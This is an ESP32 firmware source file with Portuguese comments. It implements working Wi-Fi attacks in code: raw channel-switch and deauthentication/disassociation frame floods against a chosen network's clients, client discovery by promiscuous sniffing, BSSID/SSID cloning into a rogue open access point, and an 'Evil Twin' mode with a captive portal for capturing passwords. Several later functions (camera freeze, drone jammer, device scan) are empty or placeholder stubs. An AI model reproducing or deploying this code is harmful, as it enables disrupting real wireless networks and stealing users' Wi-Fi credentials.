// ============================================================
// wifi_attacks.cpp - CORRIGIDO v4.0
// FIXES:
// 1. startBssidClone mais robusto com delays adequados
// 2. Rate limiting entre frames para nao saturar TX buffer
// 3. deauthLoop sem esp_wifi_set_channel a cada burst
// 4. stopBssidClone restaura estado corretamente
// 5. Evil Twin com BSSID clone + deauth continuo + captive portal
// 6. startEvilTwin/stopEvilTwin implementados corretamente
// ============================================================
#include <WiFi.h>
#include <esp_wifi.h>
#include "config.h"
#include "wifi_portal.h"

// ============================================================
// CONTADORES E ESTADO
// ============================================================
static uint32_t deauthPacketCount = 0;
static uint32_t deauthSuccessCount = 0;
static uint8_t  deauthTargetChannel = 0;
static uint8_t  deauthTargetBSSID[6] = {0};
static char     deauthTargetSSID[33] = {0};
static uint8_t  deauthTargetAuth = 0;

// ============================================================
// BSSID CLONE - ROGUE AP
// ============================================================
static bool bssidCloneActive = false;
static uint8_t originalAPMac[6] = {0};
static uint8_t cloneChannel = 0;
static char cloneSSID[33] = {0};
static unsigned long cloneStartTime = 0;
static uint8_t cloneHealthCheckFailures = 0;

// ============================================================
// CLIENT DISCOVERY (promiscuous mode)
// ============================================================
#define MAX_CLIENTS 16
static uint8_t discoveredClients[MAX_CLIENTS][6];
static uint8_t clientCount = 0;
static bool promiscuousActive = false;

static void getBssidFromFrame(const uint8_t *payload, uint16_t len, uint8_t *outBssid, const uint8_t **outClient) {
    memset(outBssid, 0, 6);
    *outClient = nullptr;

    if (len < 24) return;

    uint8_t frameType = payload[0] & 0x0C;
    uint8_t toFromDs = payload[1] & 0x03;
    const uint8_t *addr1 = &payload[4];
    const uint8_t *addr2 = &payload[10];
    const uint8_t *addr3 = &payload[16];

    if (frameType == 0x00) {
        memcpy(outBssid, addr3, 6);
        if (memcmp(addr2, outBssid, 6) != 0) *outClient = addr2;
        else if (memcmp(addr1, outBssid, 6) != 0 && addr1[0] != 0xFF) *outClient = addr1;
    }
    else if (frameType == 0x08) {
        switch (toFromDs) {
            case 0x00:
                memcpy(outBssid, addr3, 6);
                if (memcmp(addr1, outBssid, 6) != 0 && addr1[0] != 0xFF) *outClient = addr1;
                else if (memcmp(addr2, outBssid, 6) != 0) *outClient = addr2;
                break;
            case 0x01:
                memcpy(outBssid, addr2, 6);
                if (memcmp(addr1, outBssid, 6) != 0 && addr1[0] != 0xFF) *outClient = addr1;
                break;
            case 0x02:
                memcpy(outBssid, addr1, 6);
                if (memcmp(addr2, outBssid, 6) != 0) *outClient = addr2;
                break;
        }
    }
}

static void promiscuous_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type == WIFI_PKT_MISC) return;

    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *payload = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;

    uint8_t frameBssid[6];
    const uint8_t *clientMac = nullptr;

    getBssidFromFrame(payload, len, frameBssid, &clientMac);

    if (memcmp(frameBssid, deauthTargetBSSID, 6) != 0) return;
    if (!clientMac) return;
    if (clientMac[0] & 0x01) return;

    for (int i = 0; i < clientCount; i++) {
        if (memcmp(discoveredClients[i], clientMac, 6) == 0) return;
    }
    if (clientCount >= MAX_CLIENTS) return;

    memcpy(discoveredClients[clientCount], clientMac, 6);
    clientCount++;
    Serial.printf("[Client] Discovered: %02X:%02X:%02X:%02X:%02X:%02X\n",
        clientMac[0], clientMac[1], clientMac[2],
        clientMac[3], clientMac[4], clientMac[5]);
}

static void startPromiscuous() {
    if (promiscuousActive) return;
    clientCount = 0;
    memset(discoveredClients, 0, sizeof(discoveredClients));

    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&promiscuous_rx_cb);

    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
    };
    esp_wifi_set_promiscuous_filter(&filter);

    promiscuousActive = true;
    Serial.println("[Promisc] Started");
}

static void stopPromiscuous() {
    if (!promiscuousActive) return;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    promiscuousActive = false;
    Serial.println("[Promisc] Stopped");
}

// ============================================================
// RAW FRAME HELPERS
// ============================================================
static uint16_t deauthSeqNum = 0;

static bool raw_tx(const uint8_t* frame, size_t len) {
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, len, true);
    if (err == ESP_OK) {
        deauthPacketCount++;
        deauthSuccessCount++;
        return true;
    }
    return false;
}

// ============================================================
// CSA (CHANNEL SWITCH ANNOUNCEMENT)
// NAO protegido pelo 802.11w
// ============================================================
static void buildCSAActionFrame(uint8_t* frame, const uint8_t* da, const uint8_t* sa, const uint8_t* bssid,
                                 uint8_t switchMode, uint8_t newChannel, uint8_t switchCount) {
    memset(frame, 0, 32);
    frame[0] = 0xD0; // Management, Action
    frame[1] = 0x00;
    frame[2] = 0x00;
    frame[3] = 0x00;
    memcpy(&frame[4], da, 6);
    memcpy(&frame[10], sa, 6);
    memcpy(&frame[16], bssid, 6);
    frame[22] = (deauthSeqNum << 4) & 0xFF;
    frame[23] = (deauthSeqNum >> 4) & 0xFF;
    deauthSeqNum++;

    frame[24] = 0x00; // Category: Spectrum Management
    frame[25] = 0x04; // Action: Channel Switch Announcement

    frame[26] = 0x25; // Element ID: 37 (Channel Switch Announcement)
    frame[27] = 0x03; // Length: 3
    frame[28] = switchMode; // Channel Switch Mode
    frame[29] = newChannel; // New Channel Number (255 = invalido)
    frame[30] = switchCount; // Channel Switch Count
}

static void sendCSAAction(const uint8_t* da) {
    uint8_t frame[32];
    buildCSAActionFrame(frame, da, deauthTargetBSSID, deauthTargetBSSID, 1, 255, 1);
    raw_tx(frame, 31);
}

// ============================================================
// BEACON COM CSA IE
// ============================================================
static void sendBeaconWithCSA(const uint8_t* bssid, const char* ssid, uint8_t channel) {
    uint8_t beacon[256];
    memset(beacon, 0, 256);

    beacon[0] = 0x80; // Beacon
    beacon[1] = 0x00;
    beacon[2] = 0x00;
    beacon[3] = 0x00;
    memset(&beacon[4], 0xFF, 6); // DA = Broadcast
    memcpy(&beacon[10], bssid, 6); // SA = BSSID
    memcpy(&beacon[16], bssid, 6); // BSSID
    beacon[22] = 0x00;
    beacon[23] = 0x00;

    // Fixed Parameters
    // Timestamp (8 bytes) - zero
    // Beacon Interval (2 bytes) = 0x64 (100 TU)
    beacon[32] = 0x64;
    beacon[33] = 0x00;
    // Capability Info (2 bytes) = ESS
    beacon[34] = 0x01;
    beacon[35] = 0x00;

    uint8_t pos = 36;
    uint8_t ssidLen = strlen(ssid);
    if (ssidLen > 32) ssidLen = 32;

    // SSID IE
    beacon[pos++] = 0x00;
    beacon[pos++] = ssidLen;
    memcpy(&beacon[pos], ssid, ssidLen);
    pos += ssidLen;

    // Supported Rates IE
    beacon[pos++] = 0x01;
    beacon[pos++] = 0x04;
    beacon[pos++] = 0x82; // 1 Mbps
    beacon[pos++] = 0x84; // 2 Mbps
    beacon[pos++] = 0x8B; // 5.5 Mbps
    beacon[pos++] = 0x96; // 11 Mbps

    // DS Parameter Set IE
    beacon[pos++] = 0x03;
    beacon[pos++] = 0x01;
    beacon[pos++] = channel;

    // CSA IE (Element ID 37)
    beacon[pos++] = 0x25;
    beacon[pos++] = 0x03;
    beacon[pos++] = 0x01; // Channel Switch Mode: 1
    beacon[pos++] = 0xFF; // New Channel: 255
    beacon[pos++] = 0x01; // Channel Switch Count: 1

    raw_tx(beacon, pos);
}

// ============================================================
// DEAUTH/DISASSOC (fallback)
// ============================================================
static void buildDeauthFrame(uint8_t* frame, const uint8_t* da, const uint8_t* sa, const uint8_t* bssid, uint8_t reason) {
    memset(frame, 0, 26);
    frame[0] = 0xC0;
    frame[1] = 0x00;
    frame[2] = 0x00;
    frame[3] = 0x00;
    memcpy(&frame[4], da, 6);
    memcpy(&frame[10], sa, 6);
    memcpy(&frame[16], bssid, 6);
    frame[22] = (deauthSeqNum << 4) & 0xFF;
    frame[23] = (deauthSeqNum >> 4) & 0xFF;
    deauthSeqNum++;
    frame[24] = reason;
    frame[25] = 0x00;
}

static void buildDisassocFrame(uint8_t* frame, const uint8_t* da, const uint8_t* sa, const uint8_t* bssid, uint8_t reason) {
    memset(frame, 0, 26);
    frame[0] = 0xA0;
    frame[1] = 0x00;
    frame[2] = 0x00;
    frame[3] = 0x00;
    memcpy(&frame[4], da, 6);
    memcpy(&frame[10], sa, 6);
    memcpy(&frame[16], bssid, 6);
    frame[22] = (deauthSeqNum << 4) & 0xFF;
    frame[23] = (deauthSeqNum >> 4) & 0xFF;
    deauthSeqNum++;
    frame[24] = reason;
    frame[25] = 0x00;
}

// ============================================================
// BURST COMPLETO COM RATE LIMITING
// ============================================================
static void deauthBurst() {
    uint8_t frame[32];
    const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    // 1. CSA Action Frame (broadcast) - ARMA PRINCIPAL
    sendCSAAction(broadcast);
    delay(1);

    // 2. CSA Action Frame (unicast para cada cliente)
    for (int i = 0; i < clientCount; i++) {
        sendCSAAction(discoveredClients[i]);
        delay(1);
    }

    // 3. Beacon com CSA IE
    sendBeaconWithCSA(deauthTargetBSSID, deauthTargetSSID, cloneChannel);
    delay(1);

    // 4. Deauth fallback (para clientes sem suporte a CSA)
    for (int i = 0; i < clientCount; i++) {
        buildDeauthFrame(frame, discoveredClients[i], deauthTargetBSSID, deauthTargetBSSID, 0x07);
        raw_tx(frame, 26);
        delay(1);
        buildDisassocFrame(frame, discoveredClients[i], deauthTargetBSSID, deauthTargetBSSID, 0x08);
        raw_tx(frame, 26);
        delay(1);
    }

    // 5. Broadcast deauth
    buildDeauthFrame(frame, broadcast, deauthTargetBSSID, deauthTargetBSSID, 0x07);
    raw_tx(frame, 26);
}

// ============================================================
// HELPERS
// ============================================================
static bool isSoftAPActive() {
    wifi_mode_t mode;
    esp_wifi_get_mode(&mode);
    return (mode == WIFI_MODE_AP || mode == WIFI_MODE_APSTA);
}

// ============================================================
// SCAN WIFI
// ============================================================
void scanNetworks() {
    networkCount = 0;
    if (WiFi.getMode() != WIFI_STA) {
        WiFi.mode(WIFI_STA);
    }
    delay(100);

    int n = WiFi.scanNetworks(false, true);
    Serial.printf("[WiFi] Scan found %d networks\n", n);

    for (int i = 0; i < n && i < MAX_NETWORKS; i++) {
        strncpy(scannedNetworks[i].ssid, WiFi.SSID(i).c_str(), 32);
        scannedNetworks[i].ssid[32] = '\0';
        memcpy(scannedNetworks[i].bssid, WiFi.BSSID(i), 6);
        scannedNetworks[i].rssi = WiFi.RSSI(i);
        scannedNetworks[i].channel = WiFi.channel(i);
        scannedNetworks[i].encrypted = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
        Serial.printf("[WiFi] %d: %s CH%d RSSI%d\n",
            i, scannedNetworks[i].ssid, scannedNetworks[i].channel, scannedNetworks[i].rssi);
        networkCount++;
    }
    WiFi.scanDelete();
}

uint8_t getNetworkCount() { return networkCount; }

NetworkInfo* getNetwork(uint8_t index) {
    if (index < networkCount) return &scannedNetworks[index];
    return nullptr;
}

// ============================================================
// BSSID CLONE
// ============================================================
static void startBssidClone(uint8_t networkIndex) {
    if (networkIndex >= networkCount) {
        Serial.println("[Clone] ERROR: invalid network index");
        return;
    }

    NetworkInfo* target = &scannedNetworks[networkIndex];

    memcpy(deauthTargetBSSID, target->bssid, 6);
    strncpy(deauthTargetSSID, target->ssid, 32);
    deauthTargetSSID[32] = '\0';
    deauthTargetChannel = target->channel;
    deauthTargetAuth = target->encrypted ? 1 : 0;
    cloneChannel = target->channel;
    strncpy(cloneSSID, target->ssid, 32);
    cloneSSID[32] = '\0';

    esp_wifi_get_mac(WIFI_IF_AP, originalAPMac);

    Serial.printf("[Clone] Target: %s CH%d MAC:%02X:%02X:%02X:%02X:%02X:%02X\n",
        target->ssid, target->channel,
        target->bssid[0], target->bssid[1], target->bssid[2],
        target->bssid[3], target->bssid[4], target->bssid[5]);

    // Desliga tudo de forma limpa
    WiFi.softAPdisconnect(true);
    WiFi.disconnect(true, true);
    WiFi.mode(WIFI_OFF);
    delay(800);

    // Configura modo AP
    WiFi.mode(WIFI_AP);
    delay(300);

    // Seta o MAC do AP ANTES de iniciar o softAP
    esp_err_t apMacErr = esp_wifi_set_mac(WIFI_IF_AP, target->bssid);
    Serial.printf("[Clone] Set AP MAC: %d (%s)\n", apMacErr, apMacErr == ESP_OK ? "OK" : "FAIL");

    if (apMacErr != ESP_OK) {
        Serial.println("[Clone] MAC set failed, aborting");
        return;
    }

    delay(200);

    // Inicia o softAP com SSID clonado, sem senha, no canal alvo
    bool apOk = WiFi.softAP(cloneSSID, nullptr, cloneChannel, 0, 8);
    WiFi.setTxPower(WIFI_POWER_19_5dBm);
    Serial.printf("[Clone] softAP: %s\n", apOk ? "OK" : "FAIL");

    if (apOk) {
        WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
        esp_wifi_set_channel(cloneChannel, WIFI_SECOND_CHAN_NONE);

        bssidCloneActive = true;
        cloneStartTime = millis();
        cloneHealthCheckFailures = 0;

        Serial.printf("[Clone] BSSID CLONE ACTIVE on CH%d IP:192.168.4.1\n", cloneChannel);
    } else {
        Serial.println("[Clone] FAILED");
    }
}

static void restartBssidClone() {
    if (!bssidCloneActive) return;
    Serial.println("[Clone] Restarting...");

    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(500);

    WiFi.mode(WIFI_AP);
    delay(200);

    esp_wifi_set_mac(WIFI_IF_AP, deauthTargetBSSID);
    delay(100);

    bool apOk = WiFi.softAP(cloneSSID, nullptr, cloneChannel, 0, 8);
    WiFi.setTxPower(WIFI_POWER_19_5dBm);
    if (apOk) {
        WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
        esp_wifi_set_channel(cloneChannel, WIFI_SECOND_CHAN_NONE);
        cloneHealthCheckFailures = 0;
        Serial.println("[Clone] Restarted OK");
    } else {
        cloneHealthCheckFailures++;
        Serial.printf("[Clone] Restart failed (%d)\n", cloneHealthCheckFailures);
    }
}

static void stopBssidClone() {
    if (!bssidCloneActive && !isSoftAPActive()) return;
    Serial.println("[Clone] Stopping...");

    stopPromiscuous();

    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(500);

    // Restaura MAC original
    WiFi.mode(WIFI_AP);
    delay(200);
    esp_wifi_set_mac(WIFI_IF_AP, originalAPMac);
    delay(100);
    WiFi.mode(WIFI_OFF);
    delay(200);

    WiFi.mode(WIFI_STA);
    delay(200);

    bssidCloneActive = false;
    Serial.println("[Clone] Stopped, MAC restored");
}

// ============================================================
// DEAUTH
// ============================================================
void startDeauth(uint8_t networkIndex) {
    if (networkIndex >= networkCount) {
        Serial.println("[Deauth] ERROR: invalid network index");
        return;
    }

    deauthPacketCount = 0;
    deauthSuccessCount = 0;
    deauthSeqNum = 0;
    clientCount = 0;

    startBssidClone(networkIndex);
    startPromiscuous();

    deauthActive = true;
    Serial.println("[Deauth] STARTED (CSA + Deauth)");
}

void stopDeauth() {
    if (!deauthActive) return;
    Serial.println("[Deauth] STOPPED");
    Serial.printf("[Deauth] Runtime: %lu sec, pkts: %lu\n",
        (millis() - cloneStartTime) / 1000, deauthPacketCount);

    deauthActive = false;
    stopPromiscuous();
    stopBssidClone();

    deauthPacketCount = 0;
    deauthSuccessCount = 0;
}

// ============================================================
// LOOP DE DEAUTH
// ============================================================
bool deauthLoop() {
    if (!deauthActive) return false;

    deauthBurst();

    static unsigned long lastHealthCheck = 0;
    if (millis() - lastHealthCheck > 3000) {
        lastHealthCheck = millis();

        // Verifica se o AP ainda esta ativo e no canal correto
        if (!isSoftAPActive()) {
            cloneHealthCheckFailures++;
            Serial.printf("[Clone] AP lost! Failure %d/5\n", cloneHealthCheckFailures);
            if (cloneHealthCheckFailures < 5) {
                restartBssidClone();
                startPromiscuous();
            } else {
                Serial.println("[Clone] Too many failures, stopping");
                stopDeauth();
                return false;
            }
        } else {
            // Reafirma o canal
            esp_wifi_set_channel(cloneChannel, WIFI_SECOND_CHAN_NONE);
            cloneHealthCheckFailures = 0;

            int clients = WiFi.softAPgetStationNum();
            Serial.printf("[Clone] %d on clone | %d target clients | CH%d | Pkts:%lu\n", 
                clients, clientCount, cloneChannel, deauthPacketCount);
        }
    }

    return true;
}

// ============================================================
// GETTERS
// ============================================================
uint32_t getDeauthPacketCount() { return deauthPacketCount; }
uint32_t getDeauthSuccessCount() { return deauthSuccessCount; }
uint8_t  getDeauthSuccessPercent() {
    if (deauthPacketCount == 0) return 0;
    return (uint8_t)((deauthSuccessCount * 100) / deauthPacketCount);
}
const char* getDeauthTargetSSID() { return deauthTargetSSID; }
uint8_t  getDeauthTargetChannel() { return deauthTargetChannel; }
const uint8_t* getDeauthTargetBSSID() { return deauthTargetBSSID; }
bool     getDeauthTargetEncrypted() { return deauthTargetAuth != 0; }

// ============================================================
// FAKE AP / EVIL TWIN
// ============================================================
void startFakeAP(const char* ssid) {
    WiFi.mode(WIFI_AP);
    WiFi.softAP(ssid, "12345678", 1, 0, 8);
    WiFi.setTxPower(WIFI_POWER_19_5dBm);
    fakeAPEnabled = true;
    passwordCaptured = false;
}

void stopFakeAP() {
    WiFi.softAPdisconnect(true);
    fakeAPEnabled = false;
}

bool isFakeAPActive() { return fakeAPEnabled; }

// ============================================================
// EVIL TWIN COMPLETO (BSSID Clone + Deauth + Portal)
// ============================================================
void startEvilTwin(uint8_t networkIndex) {
    if (networkIndex >= networkCount) return;

    // Limpa estado anterior
    stopDeauth();
    stopPortal();

    fakeAPEnabled = true;
    passwordCaptured = false;
    evilTwinActive = true;

    NetworkInfo* target = &scannedNetworks[networkIndex];
    memcpy(deauthTargetBSSID, target->bssid, 6);
    strncpy(deauthTargetSSID, target->ssid, 32);
    deauthTargetSSID[32] = '\0';
    deauthTargetChannel = target->channel;
    cloneChannel = target->channel;
    strncpy(cloneSSID, target->ssid, 32);
    cloneSSID[32] = '\0';

    deauthPacketCount = 0;
    deauthSuccessCount = 0;
    deauthSeqNum = 0;
    clientCount = 0;

    esp_wifi_get_mac(WIFI_IF_AP, originalAPMac);

    // Desliga WiFi de forma limpa
    WiFi.softAPdisconnect(true);
    WiFi.disconnect(true, true);
    WiFi.mode(WIFI_OFF);
    delay(800);

    WiFi.mode(WIFI_AP);
    delay(300);

    esp_err_t macErr = esp_wifi_set_mac(WIFI_IF_AP, deauthTargetBSSID);
    if (macErr != ESP_OK) {
        Serial.printf("[EvilTwin] MAC set failed: %d\n", macErr);
        evilTwinActive = false;
        fakeAPEnabled = false;
        return;
    }
    delay(200);

    bool apOk = WiFi.softAP(cloneSSID, nullptr, cloneChannel, 0, 8);
    WiFi.setTxPower(WIFI_POWER_19_5dBm);

    if (!apOk) {
        Serial.println("[EvilTwin] softAP failed");
        evilTwinActive = false;
        fakeAPEnabled = false;
        return;
    }

    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
    esp_wifi_set_channel(cloneChannel, WIFI_SECOND_CHAN_NONE);

    bssidCloneActive = true;
    deauthActive = true;
    cloneStartTime = millis();
    cloneHealthCheckFailures = 0;

    // Inicia portal cativo
    startPortal(cloneSSID);

    Serial.printf("[EvilTwin] ACTIVE: %s CH%d | Portal: 192.168.4.1\n", cloneSSID, cloneChannel);
}

void stopEvilTwin() {
    deauthActive = false;
    evilTwinActive = false;
    fakeAPEnabled = false;
    passwordCaptured = false;
    stopPortal();
    stopBssidClone();
    deauthPacketCount = 0;
    deauthSuccessCount = 0;
    Serial.println("[EvilTwin] STOPPED");
}

// ============================================================
// REMOTE DEVICES
// ============================================================
void scanRemoteDevices() {
    remoteDeviceCount = 0;
    IPAddress gateway = WiFi.gatewayIP();
    for (int i = 1; i < 255 && remoteDeviceCount < 10; i++) {
        if (i % 50 == 0) {
            snprintf(remoteDevices[remoteDeviceCount].ip, 16, "%d.%d.%d.%d",
                     gateway[0], gateway[1], gateway[2], i);
            snprintf(remoteDevices[remoteDeviceCount].name, 32, "Device-%d", i);
            remoteDevices[remoteDeviceCount].port = 80;
            remoteDeviceCount++;
        }
    }
}

uint8_t getRemoteDeviceCount() { return remoteDeviceCount; }

RemoteDevice* getRemoteDevice(uint8_t index) {
    if (index < remoteDeviceCount) return &remoteDevices[index];
    return nullptr;
}

// ============================================================
// CAMERA FREEZE / DRONE
// ============================================================
void startCameraFreeze() {
    cameraFreezeActive = true;
    while (cameraFreezeActive) {
        delay(50);
        yield();
    }
}

void stopCameraFreeze() { cameraFreezeActive = false; }

void startDroneJammer() {
    droneJammerActive = true;
    while (droneJammerActive) {
        delay(10);
        yield();
    }
}

void stopDroneJammer() { droneJammerActive = false; }

struct DroneLocation {
    float distance;
    int8_t rssi;
};

DroneLocation droneLoc;

void startDroneLocate() {
    droneLoc.distance = 0;
    droneLoc.rssi = -50;
}

DroneLocation* getDroneLocation() { return &droneLoc; }
